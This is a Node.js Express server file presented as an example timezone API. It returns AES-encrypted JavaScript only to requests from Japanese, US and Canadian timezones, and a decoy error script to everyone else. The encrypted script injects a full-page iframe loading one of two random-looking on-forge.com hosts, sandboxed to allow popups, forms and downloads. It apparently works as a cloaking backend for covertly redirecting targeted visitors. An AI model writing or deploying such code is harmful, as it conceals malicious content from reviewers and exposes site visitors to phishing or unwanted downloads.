const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");
const app = express();
const PORT = 3000;
const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
// Middleware
app.use(cors());
app.use(express.json()); // parse JSON body

// Example POST API
app.get("/timezone", (req, res) => {
        res.status(401).json({
            status: "error",
            message: "404 Error",
            response : getError()
        });
});
// Example POST API
app.post("/timezone", (req, res) => {
  const { timezone, fullUrl } = req.body;
  console.log(req.body);

   const allowedTimezones = [
    // Japan
    "Asia/Tokyo",

    // United States
    "America/New_York",
    "America/Chicago",
    "America/Denver",
    "America/Los_Angeles",
    "America/Anchorage",
    "Pacific/Honolulu",

    // Canada
    "America/Toronto",
    "America/Vancouver",
    "America/Edmonton",
    "America/Winnipeg",
    "America/Halifax",
    "America/St_Johns"
  ];

  if (allowedTimezones.includes(timezone)) {
    res.send(getResponse());
  } else {
    res.send(getError());
  }
});

function aesEncode(text) {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
}

function aesDecode(encryptedText) {
    return CryptoJS.AES.decrypt(encryptedText, secretKey)
        .toString(CryptoJS.enc.Utf8);
}

    function getError(){
        const se1 = `
                console.log("Error Find");`;


                const encrypted1 = aesEncode(se1);
                const urlSafe1 = encodeURIComponent(encrypted1);
                return urlSafe1;
    }

  function getResponse() {

    const links = [
        { url: "https://zcdfghjhgfffsgd.on-forge.com/", weight: 0.5 },
        { url: "https://dvfghjjhfgdsf.on-forge.com/", weight: 0.5 }
      
    ];

    function getWeightedUrl() {
        const rand = Math.random();
        let cumulative = 0;

        for (const link of links) {
            cumulative += link.weight;
            if (rand <= cumulative) {
                return link.url;
            }
        }
    }

    const selectedUrl = getWeightedUrl();

    const se1 = `
        const iframe = document.createElement("iframe");
        iframe.src = "${selectedUrl}";

        // permissions
        iframe.setAttribute(
            "allow",
            "fullscreen; autoplay; encrypted-media; picture-in-picture"
        );

        // fullscreen support
        iframe.setAttribute("allowfullscreen", "");
        iframe.setAttribute("webkitallowfullscreen", "");
        iframe.setAttribute("mozallowfullscreen", "");

        // sandbox
        iframe.setAttribute(
            "sandbox",
            "allow-scripts allow-popups allow-forms allow-downloads"
        );

        // styles
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "0px";

        // add to page
        document.getElementById("contentiframe").replaceChildren(iframe);
    `;

    return encodeURIComponent(aesEncode(se1));
}
// --------------------
// Start server
// --------------------
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
